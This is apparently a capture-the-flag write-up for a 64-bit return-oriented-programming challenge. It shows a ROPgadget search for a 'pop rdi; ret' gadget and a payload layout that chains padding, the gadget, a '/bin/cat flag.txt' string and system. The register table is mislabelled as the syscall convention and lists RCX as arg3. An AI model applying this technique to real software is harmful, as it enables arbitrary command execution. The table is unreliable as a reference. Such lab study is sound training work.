# split - 64bit

The 64-bit binary is very similar to the [32-bit exploit](../32-bit/README.md). However, in x86 parameters are passed via registers instead of the stack.

Therefore, we need a gadget that pops our parameter (`/bin/cat flag.txt`) into the first parameter.

The order of the registers can be seen below:
```
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   RAX   | RDI  | RSI  | RDX  | RCX  | R8   | R9   |
+---------+------+------+------+------+------+------+
```

Finding the gadget can be achived via `ROPgadget`

Running:

```
$ ROPgadget --binary ./split | grep pop

[...]
0x0000000000400883 : pop rdi ; ret
[...]
```

Therefore out payload will be:
```
junk            p64(0x90 x 40 bytes)
pop_rdi         p64(0x400883)
bin_cat addr    p64(<ADDR>)
system addr     p64(<ADDR>)
```

With the `<ADDR> `values being replaced with values discovered in the same was as the 32-bit binary.

This results in the bit_cat address being placed in the `RDI` and, thus, passed as a parameter to `system`.